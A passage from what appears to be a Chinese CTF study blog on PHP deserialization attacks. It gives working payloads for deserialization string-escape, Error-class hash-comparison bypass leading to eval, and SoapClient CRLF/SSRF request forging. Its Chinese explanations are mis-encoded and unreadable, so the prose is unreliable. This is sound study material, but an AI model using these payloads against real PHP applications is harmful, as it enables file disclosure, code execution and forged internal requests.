 <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯æ§å˜é‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">è¿˜æœ‰ä¸€ä¸ª<span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]æ˜¯éœ€è¦æˆ‘ä»¬è¦†ç›–çš„å˜é‡</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>ç›®æ ‡å­ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(d0g3_f1ag.php)=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span></span><br><span class="line"><span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//è¿‡æ»¤åå­—ç¬¦å‡å°‘3æˆ–è€…4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//ä¸å¯æ§å˜é‡ï¼Œå›ºå®šå€¼base64_encode(&#x27;guest_img.png&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;è¿‡æ»¤å‰:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;</span><br><span class="line">è¿‡æ»¤å‰:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:4:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼š&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot; é•¿åº¦ä¸º23ï¼Œä¸ä¸º3æˆ–4çš„å€æ•°ï¼Œæœ€æ¥è¿‘çš„æ˜¯24ï¼Œæ‰€ä»¥åœ¨</span></span><br><span class="line"><span class="string">ç›®æ ‡å­ä¸²å¤´æ·»åŠ ä»»æ„ä¸€ä¸ªå­—ç¬¦å˜æˆa&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">æ‰€ä»¥è¿‡æ»¤åä¼šåƒæ‰<span class="number">24</span>ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©<span class="number">4</span>*<span class="number">6</span>æˆ–è€…<span class="number">3</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//è¿‡æ»¤åå­—ç¬¦å‡å°‘</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;<span class="comment">//è¿‡æ»¤åå‘ååƒ24ä¸ªå­—ç¬¦ï¼Œæˆ–è€…php*8</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;khaz&quot;;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//ä¸å¯æ§å˜é‡ï¼Œå›ºå®šå€¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;è¿‡æ»¤å‰:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">è¿‡æ»¤å‰:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">E:\xampp2\php\www\2.php:19:</span></span><br><span class="line"><span class="string">array(3) &#123;</span></span><br><span class="line"><span class="string">  &#x27;user&#x27; =&gt;</span></span><br><span class="line"><span class="string">  string(24) &quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="string">&#x27;img&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span></span><br><span class="line">  <span class="string">&#x27;khaz&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;æ·»åŠ äº†è¿™ä¸ªæ˜¯å› ä¸º<span class="variable">$_SESSION</span>æœ‰ä¸‰ä¸ªå€¼(a:<span class="number">3</span>),æ•°é‡è¦å¯¹çš„ä¸Šæ‰èƒ½ååºåˆ—åŒ–</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="åŸç”Ÿç±»åˆ©ç”¨"><a href="#åŸç”Ÿç±»åˆ©ç”¨" class="headerlink" title="åŸç”Ÿç±»åˆ©ç”¨"></a>åŸç”Ÿç±»åˆ©ç”¨</h1><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br></pre></td></tr></table></figure><h2 id="è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»"><a href="#è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»" class="headerlink" title="è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»"></a>è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>(); <span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>); <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>( <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__toString&#x27;</span>, <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__callStatic&#x27;</span>, <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__unset&#x27;</span>, <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</p><p>æ¯”å¦‚è¯´é¢˜ç›®ç»™çš„ä»£ç æœ‰MD5ï¼Œevalç­‰ï¼Œè¿™äº›å‡½æ•°çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥è§¦å‘<code>__tostring</code>é­”æœ¯æ–¹æ³•</p></blockquote><h2 id="Error-x2F-Exception-ç±»"><a href="#Error-x2F-Exception-ç±»" class="headerlink" title="Error&#x2F;Exception ç±»"></a>Error&#x2F;Exception ç±»</h2><blockquote><p>ç”¨äºè‡ªå®šä¹‰é”™è¯¯ç±»å‹çš„</p></blockquote><table><thead><tr><th align="center">ç±»</th><th align="center">é€‚ç”¨ç‰ˆæœ¬</th><th align="center">å±æ€§ï¼ˆä¸€æ ·çš„ï¼‰</th></tr></thead><tbody><tr><td align="center">Error</td><td align="center">php7</td><td align="center">messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹                                                           fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</td></tr><tr><td align="center">Exception</td><td align="center">php5&#x2F;php7</td><td align="center">lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·                                         codeï¼šå¼‚å¸¸ä»£ç </td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">3</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>ä»”ç»†è§‚å¯Ÿä¼šå‘ç°åªæœ‰å¼‚å¸¸ä»£ç codeæ²¡æœ‰è¢«è¾“å‡ºï¼Œå¹¶ä¸”åªæœ‰è¡Œå·lineä¸åŒ</p><p>åˆ©ç”¨</p><blockquote><p>å¯ç”¨æ¥ç»•è¿‡ç±»å±æ€§çš„å“ˆå¸Œæ¯”è¾ƒ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ä¸ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807151831343.png" alt="image-20220807151831343"></p><blockquote><p>å€¼ä¸ç›¸åŒï¼ˆå¯¹è±¡ï¼Œå¼‚å¸¸ä»£ç ä¸åŒï¼‰,md5å’Œsha1çš„å€¼ç›¸åŒï¼ˆè¾“å‡ºçš„æ˜¯ä¸€æ ·çš„ï¼‰</p></blockquote><h3 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br></pre></td></tr></table></figure><p>å¤šäº†ä¸€ä¸ªeval</p><p>åªéœ€è¦å°†payloadæ„é€ ä¸º<code>?&gt;&lt;? payload?&gt;</code>çš„å½¢å¼å³å¯,å‰é¢çš„<code>?&gt;</code>æŠŠæ–‡ä»¶åŸæ¥çš„<code>&lt;?php</code>é—­åˆäº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="meta">?&gt;</span>    <span class="meta">&lt;?php</span> payload <span class="meta">?&gt;</span>        )    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClientç±»"><a href="#SoapClientç±»" class="headerlink" title="SoapClientç±»"></a>SoapClientç±»</h2><blockquote><p>å†…ç½®callæ–¹æ³•ï¼Œå½“callæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šå‘èµ·httpè¯·æ±‚ï¼Œå¯ä»¥ä¼ªé€ ssrfè¯·æ±‚</p><p>å¹¶å› ä¸ºå¯ä»¥è‡ªå®šä¹‰user_agentè¯·æ±‚å¤´ä»è€Œé€ æˆcrlfæ¼æ´ã€‚</p></blockquote><p>å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜<a href="https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found">Fatal error: Uncaught Error: Class â€˜SoapClientâ€™ not found in</a></p><blockquote><p>CRLFæ³¨å…¥æ˜¯ä¸€ç±»æ³¨å…¥æ¼æ´ã€‚æ˜¯â€œå›è½¦+æ¢è¡Œâ€çš„ç®€ç§°ï¼Œåˆå«åšå›è½¦æ¢è¡Œç¬¦ã€‚<br>è¡¨ç¤ºä¸º<code>\r\n</code>ï¼Œç¼–ç ä¹‹åæ˜¯<code>%0d%0a</code>ã€‚è¿™ä¸ªåœ¨HTTPåè®®ä¸­è¡¨ç¤ºæ¶ˆæ¯å¤´ä¸æ¶ˆæ¯ä½“ä¹‹é—´çš„åˆ†éš”ã€‚</p><p>æµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥åˆ†ç¦»HTTPHeaderä¸HTTPBodyçš„ã€‚ä»è€ŒæŠŠHTTPå†…å®¹æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œã€‚</p></blockquote><p>ä¾‹å­SoapClient::callæ–¹æ³•å‘é€soapè¯·æ±‚,ä¼ªé€ postæ•°æ®</p><p>åœ¨linuxä¸‹æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://192.168.244.128:8888/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" /><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†Content-lengthï¼Œé‚£ä¹ˆè¯»å–äº†data&#x3D;abcåå°±ä¼šèˆå¼ƒæ‰åé¢çš„æ•°æ®</p><h2 id="æ–‡ä»¶æ“ä½œç±»"><a href="#æ–‡ä»¶æ“ä½œç±»" class="headerlink" title="æ–‡ä»¶æ“ä½œç±»"></a>æ–‡ä»¶æ“ä½œç±»</h2><p>æ³¨ï¼šFilesystemIterator æ˜¯DirectoryIteratorçš„å­ç±»ï¼Œæ‰€ä»¥å¯ä»¥å°†DirectoryIteratoræ¢ä¸ºFilesystemIteratorã€‚</p><h4 id="éå†ç›®å½•"><a href="#éå†ç›®å½•" class="headerlink" title="éå†ç›®å½•"></a>éå†ç›®å½•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/image-20221128122840348.png" alt="image-20221128122840348" 